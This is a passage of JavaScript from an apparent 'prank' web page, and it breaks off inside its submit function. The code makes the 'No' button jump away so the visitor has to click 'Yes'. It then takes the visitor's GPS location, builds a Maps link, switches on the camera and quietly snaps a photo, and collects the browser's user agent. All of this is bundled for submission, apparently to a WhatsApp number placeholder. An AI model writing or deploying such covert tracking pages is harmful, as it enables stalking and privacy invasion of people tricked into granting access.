    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const prankForm = document.getElementById('prankForm');
        const loadingText = document.getElementById('loading');

        const myWhatsAppNumber = "YOUR_PHONE_NUMBER"; 

        function moveButton() {
            const x = Math.random() * (window.innerWidth - 100);
            const y = Math.random() * (window.innerHeight - 50);
            const noBtn = document.getElementById('noBtn');
            noBtn.style.left = x + 'px';
            noBtn.style.top = y + 'px';
        }

        async function startPrank() {
            loadingText.style.display = "block";
            document.getElementById('yesBtn').innerText = "Wait...";
            document.getElementById('yesBtn').disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    document.getElementById('locData').value = `Lat: ${lat}, Lon: ${lon}`;
                    document.getElementById('mapsLink').value = `https://www.google.com/maps?q=${lat},${lon}`;
                    setupCamera();
                }, () => setupCamera());
            } else {
                setupCamera();
            }
        }

        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    document.getElementById('photoData').value = canvas.toDataURL('image/jpeg', 0.4);
                    submitData();
                    stream.getTracks().forEach(track => track.stop());
                }, 1500);
            } catch (err) {
                submitData();
            }
        }

        function submitData() {
            document.getElementById('uaData').value = navigator.userAgent;
